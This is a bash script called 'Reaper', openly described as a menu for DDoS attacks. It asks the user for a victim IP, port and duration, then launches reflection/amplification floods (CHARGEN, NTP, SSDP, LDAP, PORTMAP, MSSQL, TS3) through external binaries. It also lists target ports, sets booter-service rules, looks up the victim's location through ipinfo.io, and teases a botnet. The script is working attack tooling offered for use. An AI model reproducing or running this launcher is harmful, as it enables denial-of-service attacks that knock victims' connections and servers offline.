############ # This menu is strictly meant for DDoSing
# Created off of the Reaper serverside
# This is not meant to be used as a botnet. Instead, use it as a menu for amplifications/IP header modifications :) 
# Edited by: Vexvain
############ 
#!/bin/bash 
BLACK='\e[38;5;0m' 
BLUE='\e[38;5;4m' 
GREEN='\e[38;5;2m' 
CYAN='\e[38;5;6m' 
RED='\e[38;5;1m' 
MAGENTA='\e[38;5;5m'
PINK='\e[38;5;13m' 
BROWN='\e[38;5;88m' 
GRAY='\e[38;5;8m' 
LIGHTGRAY='\e[38;5;245m' 
LIGHTBLUE='\e[38;5;81m'
DARKBLUE='\e[38;5;21m' 
LIGHTGREEN='\e[38;5;40m'
BRIGHTGREEN='\e[38;5;10m' 
LIGHTCYAN='\e[38;5;14m' 
LIGHTRED='\e[38;5;9m'
BRIGHTRED='\e[38;5;196m' 
LIGHTMAGENTA='\e[38;5;165m'
LIGHTPINK='\e[38;5;207m' 
YELLOW='\e[38;5;11m' 
LIGHTYELLOW='\e[38;5;226m' 
WHITE='\e[38;5;231m'
ORANGE='\e[38;5;208m'  
clear 
tput civis 
who am i >> logs.txt 
echo -n -e "${BRIGHTGREEN}Loading the Reaper :)\r" 
sleep 2 
echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}# ${WHITE}(5%)\r" 
sleep 1 
echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}### ${WHITE}(10%)\r" 
sleep 1 
echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}######## ${WHITE}(25%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}################## ${WHITE}(40%)\r"
sleep 1
echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}############################## ${WHITE}(65%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}#################################### ${WHITE}(80%)\r"
sleep 1
echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}######################################### ${WHITE}(95%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}#############################################${WHITE}] (100%) ${BRIGHTGREEN}Finished" 
sleep 2
echo -ne '\n'
echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}# ${WHITE}(5%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#####${WHITE}(23%)\r"
sleep 1
echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}###########${WHITE}(39%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}###############${WHITE}(55%)\r"
sleep 1
echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}####################${WHITE}(71%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#########################${WHITE}(77%)\r"
sleep 2
echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}###################################${WHITE}(95%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#############################################${WHITE}] (100%) ${BRIGHTGREEN}Finished"
sleep 2
echo -ne '\n'
echo -n -e "${WHITE}WELCOME TO THE ${BRIGHTGREEN}REA${PINK}PER${WHITE}!"
sleep 5
echo -ne '\n' 
tput cnorm 
while true 
do 
clear 
echo -e "
          ${BRIGHTGREEN}8888888b 
          ${BRIGHTGREEN}888   Y88b 
          ${BRIGHTGREEN}888    888 
          ${BRIGHTGREEN}888   d88P .d88b.   8888b.   88888b.   .d88b.  888d888
          ${BRIGHTGREEN}8888888b  d8P  Y8b      88b  888  88b d8P  Y8b 888P
          ${BRIGHTGREEN}888 T88b  88888888 .d888888  888  888 88888888 888
          ${PINK}888  T88b Y8b.     888  888  888 d88P Y8b.     888
          ${PINK}888   T88b  Y8888   Y888888  88888P     Y8888  888
                                       ${PINK}888
                                       ${PINK}888
                                       ${PINK}888

              ${BRIGHTGREEN}**********************************************
              ${WHITE}*                ${PINK}@${BRIGHTGREEN}VEXVAIN${WHITE}#0578               ${WHITE}*
              ${PINK}**********************************************

" 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e "${WHITE}[${PINK}root${WHITE}@${BRIGHTGREEN}Reaper${PINK}~${WHITE}]${BRIGHTGREEN}#${BRIGHTGREEN} \c" 
read answer 
if [[ $answer == HELP ]] 
then 
clear 
echo -e "" 
echo -e "${PINK}Select An Option:" 
echo -e "${WHITE}[${LIGHTRED}HELP${WHITE}] -${WHITE}Shows Attack Methods" 
echo -e "${WHITE}[${LIGHTYELLOW}RULES${WHITE}] -${WHITE}Shows the T.O.S of ReaperNet" 
echo -e "${WHITE}[${LIGHTBLUE}PORTS${WHITE}] -${WHITE}Shows Usable Ports" 
echo -e "${WHITE}[${LIGHTMAGENTA}STRESS${WHITE}] -${WHITE}Shows Boot Tutorial" 
echo -e "${WHITE}[${LIGHTCYAN}EXTRA${WHITE}] -${WHITE}Shows Something For Newbies" 
echo -e "${WHITE}[${LIGHTPINK}ADMINS${WHITE}] -${WHITE}Shows Users With Administrator Access" 
echo -e "${WHITE}[${ORANGE}CONTACTS${WHITE}] -${WHITE}Shows Admin Contact Info" 
echo -e "${WHITE}[${LIGHTGREEN}BOTNET${WHITE}] -${WHITE}Coming Soon :)" 
read
fi 
if [[ $answer == RULES ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}RULES ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Rapid Booting ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Sharing Users ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Going Over Time ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Using Scanner Commands ${WHITE}[${PINK}+${WHITE}]" 
read
fi 
if [[ $answer == STRESS ]] 
then 
clear 
echo -e "${PINK} /-----------------------------------------------------------\ " 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}LDAP  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} |" 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}SSDP  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}TS3  ${WHITE}Protocol:${LIGHTMAGENTA}TCP  ${WHITE}Good For: ${BRIGHTGREEN}Teamspeak Servers${PINK} | " 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}CHARGEN  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}NTP  ${WHITE}Protocol:${BRIGHTGREEN}TCP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}PORTMAP  ${WHITE}Protocol:${BRIGHTGREEN}TCP  ${WHITE}Good For: ${BRIGHTGREEN}OVHs And Hotspots${PINK} |" 
echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}MSSQL  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}High End Servers ${PINK} | " 
echo -e "${PINK} \-----------------------------------------------------------/ " 
read 
fi 
if [[ $answer == PORTS ]] 
then 
clear 
echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}PORTS ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}22 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}23 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}53 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}80 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}443 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}1723 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}3074 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}8080 ${WHITE}[${PINK}+${WHITE}]" 
read 
fi 
if [[ $answer == EXTRA ]] 
then 
clear 
echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}EXTRA$ ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}UwU ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Max time 1000 ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Don't spam 1000 ${WHITE}[${PINK}+${WHITE}]" 
read 
fi 
if [[ $answer == ADMINS ]] 
then 
clear 
echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}ADMINS ${WHITE}[${PINK}+${WHITE}]" 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Vexvain ${WHITE}[${PINK}+${WHITE}]"  
read 
fi 
if [[ $answer == CONTACTS ]] 
then 
clear  
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Vexvain#0578 ${WHITE}[${PINK}+${WHITE}]" 
read 
fi 
if [[ $answer == BOTNET ]] 
then 
clear 
echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}COMING SOON! ${WHITE}[${PINK}+${WHITE}]" 
echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]" 
echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]"
echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]"
read 
fi 
if [[ $answer == CHARGEN ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired Port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} IP:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} Time:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./chargen $ip $port chargen.txt 1 -1 $time 
fi 
if [[ $answer == TS3 ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ts3 $ip $port ts3.txt 1 -1 $time 
fi 
if [[ $answer == NTP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ntp $ip $port ntp.txt 1 -1 $time 
fi 
if [[ $answer == SSDP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ssdp $ip $port ssdp.txt 1 -1 $time 
fi 
if [[ $answer == SENTINEL ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./sentinel $ip $port sentinel.txt 1 -1 $time 
fi 
if [[ $answer == LDAP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./ldap $ip $port ldap.txt 1 -1 $time 
fi 
if [[ $answer == PORTMAP ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip" 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./portmap $ip $port portmap.txt 1 -1 $time 
fi 
if [[ $answer == MSSQL ]] 
then 
clear 
echo -e "" 
echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${WHITE} Hitting:${PINK}$ip" 
echo -e " " 
echo -e "${WHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
echo -e "" 
echo -e "${WHITE} Starting!" 
echo -e "" 
./mssql $ip $port mssql.txt 1 -1 $time 
read 
fi 
if [[ $answer == GEO ]] 
then 
clear 
echo -e "${WHITE} Enter IP:${BRIGHTGREEN} \c" 
read ip 
echo -e "" 
echo -e "To go back to the menu, press enter" 
echo -e "" 
curl https://ipinfo.io/$ip
read 
fi 
done
